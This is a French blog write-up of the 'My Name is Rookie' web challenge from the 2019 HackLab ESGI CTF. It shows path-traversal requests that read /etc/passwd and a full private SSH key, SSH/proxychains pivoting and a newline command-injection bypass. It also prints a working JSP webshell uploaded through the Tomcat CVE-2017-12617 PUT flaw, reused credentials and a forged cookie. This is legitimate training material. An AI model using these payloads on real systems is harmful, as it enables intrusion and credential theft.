---
title: "[CTF] ESGI - My Name is Rookie"
description: "Write-up du challenge 'My Name is Rookie' (Web, 350 pts) du CTF HackLab ESGI 2019."
tags: [ "CTF", "LFI", "Proxychains", "Tomcat", "RCE" ]
lastmod: 2019-04-08 21:32:30
date: "2019-04-07 20:21:54"
categories:
    - "Write-up"
type: post
slug: "ctf-esgi-my-name-is-rookie-350"
cover: "/media/2019/04/521d3bc39a409ad016ea111cc08c63cb.png"
---

> (ง ͠° ͟ل͜ ͡°)ง
> 
> M0th3r > Quelque chose me perturbe. Comment un Androïde a pu passer le test des pirates cybernétique. Duke le premier de son genre n’a été crée par personne du gouvernement. Aujourd’hui disparu je veux retrouver son core. Si tu veux m’aider, tu dois passer le test des pirate Cybernétique. C’est le test que Duke-083 a passé haut la main. Récupère tout ce que tu sais sur Zedcorp.
> 
> http = ctf.hacklab-esgi.org:5008 \\
> ssh = ctf.hacklab-esgi.org:5007

<!--more-->

## Le site Web de ZedCorp

L'énoncé nous donne deux ports TCP, un service HTTP et un accès SSH. Nous pouvons donc d'ores et déjà supposer que nous trouverons de quoi nous connecter en SSH via le site Web.

{{< img-post alt="Page d'accueil ZedCorp" path="/media/2019/04" file="f985a3e2f9df45bc87ae58c729e769a6.png" >}}

En cherchant un peu sur le site, nous pouvons remarquer la présence d'un fichier `robots.txt` qui nous donne des pistes à creuser, notamment le répertoire `logs`.

{{< highlight plaintext >}}
User-agent: *
Disallow: /assets
Disallow: /js
Disallow: /api
Disallow: /logs
Disallow: /images
{{< /highlight >}}

Fort heureusement, l'auteur du challenge à été gentil et nous a laissé du Directory Listing. Nous avons donc 8 fichiers de logs :

{{< img-post alt="Répertoire /logs" path="/media/2019/04" file="4e60273c13a50766930ae339ae340310.png" >}}

Dans le fichier `access-details.log`, nous trouvons des échanges HTTP complet, dont plusieurs tentatives d'authentification sur http://ctf.hacklab-esgi.org:5008/login.php :

{{< highlight http >}}
POST /login.php HTTP/1.1
Host: 192.168.123.133
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:61.0) Gecko/20100101 Firefox/61.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.123.133/login.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 41
Cookie: PHPSESSID=5tg3l2vkf3o7ngc22qklp4mmd4
Connection: keep-alive
Upgrade-Insecure-Requests: 1

username=admin&password=pxrAW7a4HNMBw86bc
{{< /highlight >}}

## Zone d'administration et monitoring des logs

Nous pouvons donc nous authentifier sur le site de _ZedCorp_ avec le compte **admin**. L'interface d'administration propose de visualiser les journaux d'accès et d'erreur du serveur Web. Pour cela, une requête `POST` est envoyée avec le nom du fichier de log en paramètre. Naturellement, on essaye de récupérer un autre fichier et cela fonctionne merveilleusement bien :)

{{< highlight http >}}
POST /0cc175b9c0f1b6a831c399e269772661/admin.php HTTP/1.1
Host: ctf.hacklab-esgi.org:5008
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://ctf.hacklab-esgi.org:5008/0cc175b9c0f1b6a831c399e269772661/admin.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 38
Connection: close
Cookie: PHPSESSID=urj94cee9424reig3bje31b0a2
Upgrade-Insecure-Requests: 1

log=../../../../../../../../etc/passwd
{{< /highlight >}}
{{< highlight plaintext >}}
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
_apt:x:104:65534::/nonexistent:/bin/false
messagebus:x:105:110::/var/run/dbus:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
test:x:1001:1001:,,,:/home/test:/usr/sbin/nologin
trobin:x:1004:1004:Thibaud Robin,8,0145674356,0145674356,Trainee full stack developer:/home/trobin:/bin/bash
{{< /highlight >}}

## Se connecter en SSH

N'oublions pas que l'énoncé comportait un port SSH (TCP/5007). Précédement, nous avons vu qu'il y a deux utilisateurs sur le serveur : **test** et **trobin**. En utilisant la LFI, nous pouvons trouver les clés RSA de l'utilisateur **test** dans le répertoire `/home/test/.ssh` :

{{< highlight plaintext >}}
svu/zHqzzrRsm1un3Ikcvy0lnG31sg6kJ8EXH6ECgYEApe/Wv2KD+EDRwf4BQ19W
a2gPYIQgqraR+WHG0mL3diC58Y+uJMz3rulV47KZuYNrLL05vfLxNcEbRoKW6H1g
NmFXExuFkuPpG6oLEYVM62Bm8pksA/tkC907CY/cG4sGUYB4Rv0qKHCXrByMqp/u
SoqMrjef2P/wD2EfzCkz2AECgYBIr98m6VrLUvri7vVqjFSewcTR1k+zyF7byLFt
3Hj9WG7xYvruq2w/5TK4bGYXbopxOj5naab9EVvsyF5+twc/vPiy2VjT76Z1fwJG
BmEHuy9V07r2FWnYWlQHyKYvKPJ04JPdWgmOdicDXLJCCdq4gV5FD6bLmdVrrj0p
CSSSQQKBgQCI3TUMYeR/4+86B6i2sldPVtn52QrOHeaDwRfZ1Z7TRYPY6gIvKBLd
VVU6YcP0KwZUHeUOC7qNxSCTnB7FkANad+D/7a0MGqAGCmWChS5GD6zpqhW+tKkY
zc9Ur+20TJHIwAKloaZLiMdcpdyFUQQRStXCGD6wqbw8UxGfx1Fd0g==
-----END RSA PRIVATE KEY-----
{{< /highlight >}}

Hum, la clé RSA privée n'a pas l'air complète. Effectivement, pour afficher les logs (fonctionnalité d'origine de la zone d'administration, rappelez-vous ...), le fichier est tronqué pour n'afficher que les 10 dernières lignes ... 10 lignes ... `tail` ? Essayons avec l'option `-n 100` ...

{{< highlight http >}}
POST /0cc175b9c0f1b6a831c399e269772661/admin.php HTTP/1.1
Host: ctf.hacklab-esgi.org:5008
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://ctf.hacklab-esgi.org:5008/0cc175b9c0f1b6a831c399e269772661/admin.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 38
Connection: close
Cookie: PHPSESSID=urj94cee9424reig3bje31b0a2
Upgrade-Insecure-Requests: 1

log=../../../../../../../../home/test/id_rsa -n 100
{{< /highlight >}}

{{< highlight plaintext >}}
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA1f3hWbx2726sOiwm+gg8Td2261E7QSJhQHcQFEns7Ubonx6E
+YU4BgzQt136gK42RwoGOph8H/Tu0zfjGIx9IQOIDG8VmCItfUDFCexoqoZB2cj2
9sLKgA/VZqRJiSka1+uibcyIgFnyDegbSXt42J6XL6xZaT56aq539s8M/aFSWNEf
8yTBG7k4E0ZWqexBhXDK3rNJ1veH3EcJXBjYgitDLXSS/VPE7op6MlD5q7ZdNt28
45idJ5tT+U8xrht71oGiIswxi1dXz0VvjXOIJIk1iQIyRdiGIvPpHIY+Dxw2FTHo
pi7Z3M5hjoq36LQryHjVbUVaUrvkyeQtZXeDIQIDAQABAoIBAHloJrhAwsGo6rG+
ZwaoMX6D8cmkNpgHp2Fpq4e3QWKFPmk4aX0fZd+Y2bmO6hajwEuhllMcPB/tWKoh
JQjCfCOE22UiiP/dNC3B14h/xgopTab/642oijcJxKsNPmNBHOev2mGtDyyy2y+k
pgaUtMVBhMkZYUjil5V7ErjGU7p5CCqeZUditEMKq9eAAq8oNGq84L0ZKqx4dyPN
Ai36I8Nygk1SpYBod+K7lUYDDfd+ZPR/yEVhfHP9JqLdezfpeJW7SQvgc4Fb0rEY
+tvM0IfyIR/9tB7IrfNuXG6S+UjoP5eybasUMDn0sqSGYLfaq1pFZYolneDkrpeV
9mPBoAECgYEA+LJUBHTrdKWqxtwkugg05Iu5nEMTGhUmZ4b6x2MRGeadqPF6u9+R
0eubqX+oNWAKBgtHQSzE8faLnOJ6lc2oEN6jeukCDStYg//aIaEyZf2r/uBs0+zA
QNO8CQ5dXK5sowaFPgqXZ0mIFUmtDOgSm6M3IRc4BK6nYlxClVzTs4ECgYEA3Eal
GLMBNykaR0jCD1CartiTZay6ld1rCZVJWjONDgJGtzi0tW1j7Mr5jk0dwfp7cJVu
/Dx+sc4Om/nJ3h15pvvcrKnv0kPhqXX4h+dFmz2psTKmjYjpsff0eLRJS9JHVNEb
svu/zHqzzrRsm1un3Ikcvy0lnG31sg6kJ8EXH6ECgYEApe/Wv2KD+EDRwf4BQ19W
a2gPYIQgqraR+WHG0mL3diC58Y+uJMz3rulV47KZuYNrLL05vfLxNcEbRoKW6H1g
NmFXExuFkuPpG6oLEYVM62Bm8pksA/tkC907CY/cG4sGUYB4Rv0qKHCXrByMqp/u
SoqMrjef2P/wD2EfzCkz2AECgYBIr98m6VrLUvri7vVqjFSewcTR1k+zyF7byLFt
3Hj9WG7xYvruq2w/5TK4bGYXbopxOj5naab9EVvsyF5+twc/vPiy2VjT76Z1fwJG
BmEHuy9V07r2FWnYWlQHyKYvKPJ04JPdWgmOdicDXLJCCdq4gV5FD6bLmdVrrj0p
CSSSQQKBgQCI3TUMYeR/4+86B6i2sldPVtn52QrOHeaDwRfZ1Z7TRYPY6gIvKBLd
VVU6YcP0KwZUHeUOC7qNxSCTnB7FkANad+D/7a0MGqAGCmWChS5GD6zpqhW+tKkY
zc9Ur+20TJHIwAKloaZLiMdcpdyFUQQRStXCGD6wqbw8UxGfx1Fd0g==
-----END RSA PRIVATE KEY-----
{{< /highlight >}}

Et voilà, nous pouvons à présent nous connecter en SSH sur le port TCP/5007 avec le compte **test** :

{{< highlight terminal >}}
host:~$ ssh -i id_rsa -p 5007 test@ctf.hacklab-esgi.org 
Linux dev-server 4.9.0-6-amd64 #1 SMP Debian 4.9.88-1+deb9u1 (2018-05-07) x86_64 
 
 ____       _  ___               
|_  /___ __| |/ __|___ _ _ _ __  
 / // -_) _` | (__/ _ \ '_| '_ \ 
/___\___\__,_|\___\___/_| | .__/ 
          Dev Server      |_|    

[HINT] : Do you know proxychains ? 
Last login: Sat Apr  6 05:45:38 2019 from 94.228.190.38 
This account is currently not available. 
Connection to ctf.hacklab-esgi.org closed.
{{< /highlight >}}

## SSH et Proxychains

Évidement, pour ceux qui ont suivi, le compte **test** ne peut pas se connecter au serveur (`/usr/sbin/nologin`). Nous avons ici un indice, _"Do you know proxychains ?"_.

{{< highlight terminal >}}
host:~$ ssh -N -D 5000 -i id_rsa -p 5007 test@ctf.hacklab-esgi.org
{{< /highlight >}}

Nous avons maintenant un proxy SOCKS5 qui donne accès au réseau interne accessible depuis le serveur de ZedCorp. Question : quelles sont les autres serveurs accessibles ?

Une solution serait de scanner le range IP comme un sagouin, mais j'ai préféré chercher plus d'informations sur le serveur Web, nottament cette histoire de `tail`.

## LFI to RCE

Rappelez-vous, pour obtenir la clé privée RSA, nous avions supposé que la commande `tail` était utilisée et avions ajouté l'option `-n 100` pour augmenter le nombre de lignes du fichier à afficher. Y aurait-il une RCE ?

Lorsque l'on essaye d'ajouter un `;` pour chaîner les commandes, le serveur refuse de l'exécuter et répond _"Error : use of forbidden chars..."_. En continuant à creuser, on s'aperçoit que le serveur ne filtre pas le retour chariot `%0A` ... RCE !

Le but est de savoir quelle sont les autres serveurs voisins de celui-ci. En regardant les interfaces réseau (`ip a`), nous observons deux interfaces **ens192** (`10.10.40.2/29`) et **ens224** (`10.0.0.1/16`). Notre connexion SSH est établie sur l'interface **ens192**.

{{< highlight terminal >}}
10.0.0.1:~$ ss -t
State      Recv-Q Send-Q Local Address:Port      Peer Address:Port                
ESTAB      0      0      10.10.40.2:ssh          X.X.X.X:48040                
ESTAB      0      0      10.0.0.1:55480          10.0.0.1:http                 
ESTAB      0      0      10.10.40.2:ssh          X.X.X.X:48418                
ESTAB      0      0      ::ffff:10.0.0.1:http    ::ffff:10.0.0.1:55480
{{< /highlight >}}

Le réseau interne de ZedCorp semble donc se trouver sur le range `10.0.0.0/16`. Et c'est le fichier `/etc/hosts` qui nous donne la réponse que nous cherchions, à savoir les deux autres serveurs du réseau interne de _ZedCorp_.

{{< highlight plaintext >}}
127.0.0.1   localhost
127.0.1.1   dev-server

10.0.0.1    dev-server      dev-server.zedcorp
10.0.0.2    project-server  project-server.zedcorp
10.0.0.3    admin-server    admin-server.zedcorp

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
{{< /highlight >}}

Comme quoi, la RCE n'était pas forcément utile ...

## Scan du réseau interne

En utilisant Proxychains et Nmap, nous pouvons cartographier le réseau interne de _ZedCorp_ :

{{< highlight terminal >}}
host:~$ proxychains nmap 10.0.0.2
ProxyChains-3.1 (http://proxychains.sf.net) 
Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-06 00:35 CEST 
Nmap scan report for 10.0.0.2 
Host is up (0.0042s latency). 
Not shown: 997 closed ports 
PORT     STATE SERVICE 
22/tcp   open  ssh 
8009/tcp open  ajp13 
8080/tcp open  http-proxy 

Nmap done: 1 IP address (1 host up) scanned in 4.74 seconds 
{{< /highlight >}}
{{< highlight terminal >}}
host:~$ proxychains nmap 10.0.0.3
ProxyChains-3.1 (http://proxychains.sf.net) 
Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-06 00:35 CEST 
Nmap scan report for 10.0.0.3 
Host is up (0.0054s latency). 
Not shown: 997 closed ports 
PORT   STATE SERVICE 
21/tcp open  ftp 
22/tcp open  ssh 
80/tcp open  http 

Nmap done: 1 IP address (1 host up) scanned in 4.59 seconds
{{< /highlight >}}

Nous n'avons pas d'identifiants pour les accès SSH et FTP, le service AJP du serveur **project-server** (`10.0.0.2`) est authentifié et les comptes par défaut ont été modifiés, et le service Web du serveur **admin-server** (`10.0.0.3`) est protégé par une Basic-Auth.

Il ne nous reste plus que le Tomcat : http://10.0.0.2:8080/

## OSINT et fausses pistes

Le serveur Tomcat nous donne accès à la TODO-list de _ZedCorp_ :

{{< img-post alt="TODO-list ZedCorp" path="/media/2019/04" file="9d417b0cb15a89426450957da034b3eb.png" >}}

Dans la liste des choses à faire, nous notons que le formulaire d'authentification du serveur d'administration présente un bug. En effet, la page http://10.0.0.3/index.php renvoyait, en plus de l'erreur 401, le formulaire d'authentification du site.

Après avoir testé, sans succés, les injections en tout genre, je me décide à chercher plus d'informations sur la TODO-list. Nous pouvons voir que la session **CEO** est en train de recevoir de nouvelles fonctionnalités. On ne sait jamais, sur un malentendu ...

Hop, `ceo:ceo` et nous sommes authentifié ! Mais nous obtenons le message _"ERROR: CEO session is currently deactivated for maintenance"_.

Autre information sur la TODO-list : il est mentionné la mise en place de backup FTP, et effectivement le compte **backup** existe sur le service FTP du serveur d'administration.

> Après avoir passé pas mal de temps sur ce formulaire, je me décide à aller voir l'auteur du challenge qui m'informe que le comportement du formulaire d'authentification n'était pas intentionnel.

## RCE Tomcat

Les pages d'erreur obtenue sur le serveur Tomcat nous divulguent sur la version : **Apache Tomcat 7.0.41**. Une petite recherche rapide sur Internet nous informe que cette version est vulnérable à la [**CVE-2017-12617**](https://www.cvedetails.com/cve-details.php?t=1&cve_id=CVE-2017-12617) si jamais la méthode PUT est acceptée ... Et elle l'est. Nous poussons donc notre Webshell JSP sur le serveur :

{{< highlight http >}}
PUT /rookie.jsp/ HTTP/1.1
Host: 10.0.0.2:8080
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Length: 463

<%@ page import="java.util.*,java.io.*" %>
<%
String cmd = request.getParameter("cmd");
String output = "";
if(cmd != null) {
    String s = null;
    try {
        Process p = Runtime.getRuntime().exec(cmd,null,null);
        BufferedReader sI = new BufferedReader(new
        InputStreamReader(p.getInputStream()));
        while((s = sI.readLine()) != null) { output += s+"\n"; }
    } catch(IOException e) { e.printStackTrace(); }
}
%>
<pre><%=output %></pre>
{{< /highlight >}}

Le serveur nous répons avec `HTTP/1.1 201 Crée`, merveilleux, nous pouvons mainteant exécuter des commandes sur le serveur via la page http://10.0.0.0:8080/rookie.jsp.

## Un historique Bash mal nettoyé

Dans la TODO-list, nous avions vu le message suivant : _"Some credentials was found on project-server. Please can you check your home and delete sensible informations ? Thx"_.

En effet, les répertoires des utilisateurs ont été nettoyés, mais ont-ils été vraiment bien nettoyés ? Lorsque nous cherchons un peu sur le serveur, nous sommes mis sur la voie par les droits en lecture du fichier `/home/dcloutier/.bash_history` (-rw-r--r--), seul fichier `.bash_history` entre tous accessible en lecture. Et bingo, on y retrouve des identifiants FTP :

{{< highlight plaintext >}}
[...]

tar -czf - credentials.txt | openssl enc -e -aes256 -out credentials.tar.gz
tar -czf - credentials.txt | openssl enc -e -aes256 -out credentials.tar.gz --pass pass:daniel2019
ls -al
cat credentials.txt 
lftp -u 'backup,46t5r2e5t&2z!' admin-server
lftp -c 'open -u backup,46t5r2e5t&2z! admin-server; put -O / credentials.tar.gz' 
lftp -c 'open -u backup,46t5r2e5t&2z! admin-server; put -O / ~/credentials.tar.gz' 

[...]
{{< /highlight >}}

## Connexion FTP et récupération des identifiants

Grace aux identifiants ainsi trouvés, nous pouvons utiliser le compte **backup** pour nous connecter au FTP sur serveur d'administration (`10.0.0.3`) et récupérer le fichier `credentials.tar.gz` que l'utilisateur **dcloutier** y a déposé :

{{< highlight terminal >}}
host:~$ proxychains lftp -u 'backup,46t5r2e5t&2z!' 10.0.0.3
host:~$ openssl enc -d -aes256 -in credentials.tar.gz -out credentials.tgz --pass pass:daniel2019
host:~$ tar -xcvf credentials.tgz
host:~$ cat credentials.txt
{{< /highlight >}}

Nous obtenons enfin tous les sésames pour le serveur d'administration !

{{< highlight markdown >}}
CREDENTIALS 
=========== 
- Basic auth on http://admin-server:80 
   + Username : admin 
   + Password : zedc0rp2019! 

- Simple test account on http://admin-server:80 
   + Username : user 
   + Password : user-zedcorp-2019 

- Privileged test account on http://admin-server:80 
   + Username : admin 
   + Password : admin-zedcorp-2019 

- CEO Privileged test account on http://admin-server:80 
   + Username : ceo
{{< /highlight >}}

## Site d'administration _ZedCorp_

Une fois authentifié sur la Basic-Auth, nous pouvons tester les différents comptes :

- user : _"No documents found"_
- admin : _"No documents found"_
- ceo : _"ERROR: CEO session is currently deactivated for maintenance"_

Hum, tout ce chemin pour ne rien trouver sur le serveur ...

En regardant attentivement, nous observons la création d'un cookie **status** avec une valeur en base64, qui une fois décodé nous donne ceci :

- user: `status=dXNlcg==` (user)
- admin: `status=YWRtaW4=` (admin)
- ceo: aucun cookie

Logiquement, le compte **user** possède le statut `user` et le compte **admin** possède le statut `admin`. Il nous reste le compte **ceo** qui ne possède pas de cookie (sûrement car il est désactivé), mais qui possède peut-être un statut ...

En modifiant la valeur du cookie par **ceo** (`status=Y2Vv`), nous obtenons une page avec plusieurs liens vers des documents PDF, dont un qui nous intéresse ici : http://10.0.0.3/273181bb39e87be4fe872ae250ec428ff55f0e0ef937999114248d1dfd4a6f74/rizone.pdf.

{{< img-post alt="FLAG" path="/media/2019/04" file="f878ab48c6e042afef6f05a0cc6993d6.png" >}}

    ESGI{W3_H0p3_t0_S33_y0u_N3xT_Y34R}

> Merci à [@Th1b4ud](https://github.com/thibaudrobin) pour ce challenge :)